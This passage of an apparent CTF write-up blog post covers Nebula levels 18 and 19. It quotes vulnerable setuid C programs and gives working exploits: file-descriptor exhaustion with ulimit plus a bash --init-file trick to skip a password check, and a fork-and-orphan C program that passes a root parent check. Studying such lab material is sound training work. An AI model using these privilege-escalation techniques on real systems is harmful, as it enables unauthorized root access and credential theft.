+        <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="s">"Unable to read password file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">PWFILE</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+                <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>       
+    <span class="p">}</span>
+    <span class="n">dprintf</span><span class="p">(</span><span class="s">"logged in successfully (with%s password file)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
+        <span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="s">"out"</span> <span class="o">:</span> <span class="s">""</span><span class="p">);</span>
+    
+    <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">notsupported</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">what</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+    <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"--&gt; [%s] is unsupported at this current time.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
+    <span class="n">dprintf</span><span class="p">(</span><span class="n">what</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">setuser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+    <span class="n">sprintf</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="s">"unable to set user to '%s' -- not supported.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">msg</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="kt">char</span> <span class="n">c</span><span class="p">;</span>
+
+    <span class="k">while</span><span class="p">((</span><span class="n">c</span> <span class="o">=</span> <span class="n">getopt</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="s">"d:v"</span><span class="p">))</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">switch</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">case</span> <span class="sc">'d'</span><span class="p">:</span>
+                <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">optarg</span><span class="p">,</span> <span class="s">"w+"</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Unable to open %s"</span><span class="p">,</span> <span class="n">optarg</span><span class="p">);</span>
+                <span class="n">setvbuf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="sc">'v'</span><span class="p">:</span>
+                <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="o">++</span><span class="p">;</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="n">dprintf</span><span class="p">(</span><span class="s">"Starting up. Verbose level = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span><span class="p">);</span>
+
+    <span class="n">setresgid</span><span class="p">(</span><span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">(),</span> <span class="n">getegid</span><span class="p">());</span>
+    <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+    
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="o">*</span><span class="n">q</span><span class="p">;</span>
+
+        <span class="n">q</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">q</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">'\n'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="sc">'\r'</span><span class="p">);</span> <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+        <span class="n">dvprintf</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">"got [%s] as input</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">line</span><span class="p">);</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"login"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"attempting to login</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="n">login</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">6</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"logout"</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"shell"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">dvprintf</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s">"attempting to start shell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span><span class="p">)</span> <span class="p">{</span>
+                <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+                <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"unable to execve"</span><span class="p">);</span>
+            <span class="p">}</span>
+            <span class="n">dprintf</span><span class="p">(</span><span class="s">"Permission denied</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"logout"</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"closelog"</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="n">fclose</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">);</span>
+            <span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"site exec"</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">notsupported</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">10</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"setuser"</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">setuser</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>void closelog(): closes the descriptor being used to write to the system logger.</p>
+</blockquote>
+
+<blockquote>
+  <p>ulimit -n: set or get the shells resource usage limits. Option -n sets the maximum number of open file descriptors (most systems do not allow this value to be set).</p>
+</blockquote>
+
+<blockquote>
+  <p>bash –init-file: the last parameter is used as a script-file, which is executed.</p>
+</blockquote>
+
+<ol>
+  <li>The program can be invoked with a command like <code class="language-plaintext highlighter-rouge">./flag18 -vvv -d /tmp/log</code>. What it does is check if your password is in the password file stored in <code class="language-plaintext highlighter-rouge">/home/flag18/password</code>, and if yes it will log you in and let you use the shell. However, there is a catch: in the <code class="language-plaintext highlighter-rouge">login()</code> method if the password file cannot be accessed there is no exception throw, meaning that we will just reach the <code class="language-plaintext highlighter-rouge">global.loggedin = 1</code> instruction and therefore we will be allowed to access the shell.</li>
+  <li>To see what is going on in our program, we prepare the log file and we tail it in the background: <code class="language-plaintext highlighter-rouge">touch /tmp/log; tail -f /tmp/log &amp;</code>. This will already occupy one of the free file descriptors that we will allow in the next step.</li>
+  <li>We can’t prevent the access to the password file by moving or renaming it, because the path is hardcoded and we don’t have permissions to manipulate the file. So we have to find another way to block the access to the password file without touching it directly: that’s where the ability to set <code class="language-plaintext highlighter-rouge">ulimit</code> gets interesting. We want to set the value so low that the shell session will reach the limit before trying to open the password file, and therefore failing at that. A good number could be <code class="language-plaintext highlighter-rouge">ulimit -n 4</code></li>
+  <li>We can now start out program, with <code class="language-plaintext highlighter-rouge">./flag18 -vvv -d /tmp/log</code>. The system will complain about too many files open, but it will anyway execute flag18. So we can attempt login and see that we are logged in successfully without a password file.</li>
+  <li>The next command that we pass is shell to try and get access to the flag18 shell. However, the attempt fails because the shell tries to open a library and it gets blocked by the newly set ulimit. To get around this, we can make use of the closelog method: just login again, and run <code class="language-plaintext highlighter-rouge">closelog</code> before trying to invoke the shell.</li>
+  <li>The shell command works properly, but we get an error saying that it does not recognize the -d option. This means that the first parameter must be something it recognizes, from the GNU long options (as hinted by the error that we got). A good idea is to use the <code class="language-plaintext highlighter-rouge">--init-file</code>, that will read the path that we pass to -d as something to be executed. The first “command” will be <em>Starting</em> with parameters <em>up</em>. We have to make sure that such a file exists and can be executed with something useful.</li>
+  <li>
+    <p>We create the <em>Starting</em> file as an executable script in /tmp, and make it open a shell:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c">#!/bin/bash</span>
+ /bin/getflag <span class="o">&gt;&gt;</span> /tmp/flag18.out
+</code></pre></div>    </div>
+  </li>
+  <li>We make it executable with <code class="language-plaintext highlighter-rouge">chmod +x /tmp/Starting</code>. To make sure this file can be found, we prepend the /tmp to PATH: <code class="language-plaintext highlighter-rouge">export PATH=/tmp:$PATH</code></li>
+  <li>
+    <p>It’s now a good time to logout completely from the challenge and login again, just to make sure that we do all the operations in the right order:</p>
+
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nb">tail</span> <span class="nt">-f</span> /tmp/log &amp;
+ <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+ <span class="nb">ulimit</span> <span class="nt">-n</span> 4
+ ./flag18 <span class="nt">--init-file</span> <span class="nt">-d</span> /tmp/log
+ login
+ closelog
+ shell
+</code></pre></div>    </div>
+  </li>
+  <li>At the end of these instructions we will still get an error, but it is because our –init-file option is still trying to execute the lines in the log file and is obviously failing. If we go in the /tmp folder we can see that out flag18.out file is there and it says that we executed getflag properly.</li>
+</ol>
+
+<p>Just as an additional instruction to satisfy my curiosity, in the Starting script I also put a line to print the content of the password file: we aren’t allowed to do that, but the script will have higher permissions so it will work.</p>
+
+<h3 id="level-19">[Level 19]</h3>
+<p>There is a flaw in the below program in how it operates.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+    <span class="n">pid_t</span> <span class="n">pid</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="k">struct</span> <span class="n">stat</span> <span class="n">statbuf</span><span class="p">;</span>
+
+    <span class="cm">/* Get the parent's /proc entry, so we can verify its user id */</span>
+
+    <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="s">"/proc/%d"</span><span class="p">,</span> <span class="n">getppid</span><span class="p">());</span>
+
+    <span class="cm">/* stat() it */</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">statbuf</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Unable to check parent process</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="cm">/* check the owner id */</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">statbuf</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="cm">/* If root started us, it is ok to start the shell */</span>
+
+        <span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+        <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">"Unable to execve"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"You are unauthorized to run this program</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>init: is the first process started during booting of the computer system. It is a daemon process that continues running until the system is shut down. It is the direct or indirect ancestor of all other processes and automatically adopts all orphaned processes.</p>
+</blockquote>
+
+<blockquote>
+  <p>pid_t fork(void): creates a new process (child) by duplicating the calling process (parent).The processes run in separate memory spaces. At the time of fork() both memory spaces have the same content.</p>
+</blockquote>
+
+<blockquote>
+  <p>int execve(const char *filename, char *const argv[], char *const envp[]): executes the program pointed to by filename. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.</p>
+</blockquote>
+
+<blockquote>
+  <p>int setresuid(uid_t ruid, uid_t euid, uid_t suid): sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. A privileged process may set its UIDs to arbitrary values.</p>
+</blockquote>
+
+<ol>
+  <li>The only way to get to the shell is to run the program as root, and we are clearly not root. However, we can make use of the Unix adopting policy for orphaned processes: init was started by root, as we can see with <code class="language-plaintext highlighter-rouge">ps -ef | grep init</code> (-e to see all processes, -f to format it properly), and having processes adopted by it would escalate their privileges.</li>
+  <li>
+    <p>This means that we need a process that starts flag19 and then dies before the checks on the parent ID. This can be achieved with a <code class="language-plaintext highlighter-rouge">fork()</code>. We have to write a C program that forks itself, then we wait for this new process to become orphaned, and then we call <code class="language-plaintext highlighter-rouge">execve()</code> with the flag19 binary to run the getflag command in a shell with proper permissions.</p>
+
+    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">){</span>
+     <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+
+     <span class="k">if</span><span class="p">(</span><span class="n">child</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
+         <span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+         <span class="n">setresuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
+         <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="s">"/bin/getflag"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+         <span class="n">execve</span><span class="p">(</span><span class="s">"/home/flag19/flag19"</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+     <span class="p">}</span>
+     <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+ <span class="p">}</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Compile this file with <code class="language-plaintext highlighter-rouge">gcc /tmp/flag19.c -o /tmp/flag19</code>`, give it execution permissions if needed, and run it.</li>
+  <li>The parent process will die upon spawn of the child, which in turn will have UID == 0 and therefore pass the check and be allowed to enter the original <code class="language-plaintext highlighter-rouge">execve</code> in the /home/flag19/flag19 program. This will execute <code class="language-plaintext highlighter-rouge">getflag</code> for us.</li>
+</ol>
+
+
+        </div>
+
+        
+          <div class="page-share">
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F05%2FNebula.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--facebook btn--small"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i> <span>Share</span></a>
+  <a href="https://twitter.com/intent/tweet?text=Nebula+CTF%20http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F05%2FNebula.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--twitter btn--small"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i> <span>Tweet</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F05%2FNebula.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--linkedin btn--small"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> <span>LinkedIn</span></a>
+  <a href="https://reddit.com/submit?title=Nebula+CTF&url=http%3A%2F%2Flocalhost%3A4000%2Fctf%2F2023%2F11%2F05%2FNebula.html" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" class="btn btn--reddit btn--small"><i class="fab fa-fw fa-reddit" aria-hidden="true"></i> <span>Reddit</span></a>
+</div>
+
+        
+
+        
+
+        <nav class="page-pagination" role="navigation">
+  
+    <a class="page-previous" href="/ctf/2023/11/04/Binary-Bomb.html">
+      <h4 class="page-pagination-label">Previous</h4>
+      <span class="page-pagination-title">
+        <i class="fas fa-arrow-left"></i> Binary Bomb
+
+      </span>
+    </a>
+  
+
+  
+    <a class="page-next" href="/ctf/2023/11/06/Protostar.html">
+      <h4 class="page-pagination-label">Next</h4>
+      <span class="page-pagination-title">
+        Protostar CTF
+ <i class="fas fa-arrow-right"></i>
+      </span>
+    </a>
+  
+</nav>
+
+      </div>
+    </div>
+  </article>
+</main>
+
+
+    <footer id="footer" class="site-footer">
+  <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+<div class="social-icons"><a class="social-icon" href="/atom.xml"><i class="fas fa-rss-square fa-2x" title="Feed"></i></a></div><div class="copyright">
+    
+      <p>&copy; 2024 Cloud Castle Chaos. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://github.com/mmistakes/so-simple-theme" rel="nofollow">So Simple</a>.</p>
+    
+  </div>
+</footer>
+
+    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+<!-- MathJax -->
+
+<script>
+// http://docs.mathjax.org/en/latest/upgrading/v2.html
+MathJax = {
+  tex: {
+      tags: "ams"    // eq numbering options: none, ams, all
+  },
+  options: {
+    renderActions: {
+      // for mathjax 3, handle <script "math/tex"> blocks inserted by kramdown
+      find: [10, function (doc) {
+        for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+          const display = !!node.type.match(/; *mode=display/);
+          const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+          const text = document.createTextNode('');
+          node.parentNode.replaceChild(text, node);
+          math.start = {node: text, delim: '', n: 0};
+          math.end = {node: text, delim: '', n: 0};
+          doc.math.push(math);
+        }
+      }, '']
+    }
+  }
+}
+</script>
+
+<script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-svg.js"></script>
+
+  </body>
+
+</html>
